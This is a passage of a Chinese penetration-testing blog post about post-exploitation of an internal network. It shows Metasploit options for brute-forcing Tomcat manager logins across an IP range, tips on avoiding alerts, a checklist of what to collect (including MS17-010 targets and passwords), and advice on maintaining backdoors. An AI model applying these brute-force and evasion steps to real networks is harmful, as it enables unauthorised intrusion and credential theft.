</span></span><span style=display:flex><span>   PASS_FILE         /Volumes/OSXData/Pentester/Dict/100.txt                                                      no        File containing passwords, one per line
</span></span><span style=display:flex><span>   Proxies           socks5:***.***.***.***:1080                                                                   no        A proxy chain of format type:host:port[,type:host:port][...]
</span></span><span style=display:flex><span>   RHOSTS            10.159.63.70-133                                                                             yes       The target address range or CIDR identifier
</span></span><span style=display:flex><span>   RPORT             8080                                                                                         yes       The target port (TCP)
</span></span><span style=display:flex><span>   SSL               false                                                                                        no        Negotiate SSL/TLS for outgoing connections
</span></span><span style=display:flex><span>   STOP_ON_SUCCESS   false                                                                                        yes       Stop guessing when a credential works for a host
</span></span><span style=display:flex><span>   TARGETURI         /manager/html                                                                                yes       URI for Manager login. Default is /manager/html
</span></span><span style=display:flex><span>   THREADS           10                                                                                           yes       The number of concurrent threads
</span></span><span style=display:flex><span>   USERNAME                                                                                                       no        The HTTP username to specify for authentication
</span></span><span style=display:flex><span>   USERPASS_FILE     /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
</span></span><span style=display:flex><span>   USER_AS_PASS      false                                                                                        no        Try the username as the password for all users
</span></span><span style=display:flex><span>   USER_FILE         /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
</span></span><span style=display:flex><span>   VERBOSE           true                                                                                         yes       Whether to print output for all attempts
</span></span><span style=display:flex><span>   VHOST                                                                                                          no        HTTP server virtual host
</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/f3aefeea-4f5e-11ec-b44a-00d861bf4abb.png alt=tomcat爆破></p><p>如我所料，没有一个成功的，也发现了一些SSH端口，但是会把流量升高，触发一些警报，就没有再尝试这种爆破手法了。</p><h2 id=0x13-需要搜集的信息>0x13 需要搜集的信息</h2><p>搜集的信息列出来，就不贴了：</p><ul><li>服务器当前所在网段的所有主机端口</li><li>服务器ARP缓存</li><li>服务器上的服务</li><li>内网中其他HTTP服务</li><li>满足容易利用的漏洞端口 （MS17010 / 445）</li><li>抓包嗅探还是很有必要的 （千万不要ARP %@#@@651#@^#@@#@@###@@!）</li><li>共享文件</li><li>密码</li></ul><h2 id=0x14-总结>0x14 总结</h2><ul><li>在行动之前思考几分钟，有没有更好的办法</li><li>思考一个问题多个解决方案的利弊</li><li>尽量快速熟悉网络环境 -> [前提是你已经熟悉了服务器环境]</li><li>对日志要时刻保持敏感</li><li>看子网掩码、计算子网大小，判断有没有VLAN</li><li>选取自己熟悉的协议进行信息搜集</li><li>网络命令一定要熟</li><li>对于后门要加强维护</li><li>你必须保证你花费98%的时间都在了解他们</li><li>学习使用Powershell和熟练掌握端口转发</li></ul></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-信息搜集---后渗透>0x01 信息搜集 - 后渗透</a></li><li><a href=#0x02-后渗透的开始>0x02 后渗透的开始</a><ol><li><a href=#权限维持>权限维持</a></li></ol></li><li><a href=#0x03-关于权限维持的思考>0x03 关于权限维持的思考</a></li><li><a href=#0x04-端口转发之portfwd详解>0x04 端口转发之portfwd详解</a><ol><li><a href=#使用portfwd>使用portfwd</a></li><li><a href=#端口扫描>端口扫描</a></li></ol></li><li><a href=#0x05-meterpreter>0x05 Meterpreter</a><ol><li><a href=#获取hash的几个方式>获取Hash的几个方式</a></li></ol></li><li><a href=#0x06-powershell技巧>0x06 PowerShell技巧</a><ol><li><a href=#外部powershell脚本>外部Powershell脚本</a></li></ol></li><li><a href=#0x07-再一次克服困难>0x07 再一次克服困难</a></li><li><a href=#0x08-开始扫描>0x08 开始扫描</a></li><li><a href=#0x09-信息搜集基本结果>0x09 信息搜集基本结果</a><ol><li><a href=#轻松获得域控服务器>轻松获得域控服务器</a></li></ol></li><li><a href=#0x10-内网核心>0x10 内网核心</a></li><li><a href=#0x12-配置引发的隐患>0x12 配置引发的隐患</a></li><li><a href=#0x13-需要搜集的信息>0x13 需要搜集的信息</a></li><li><a href=#0x14-总结>0x14 总结</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>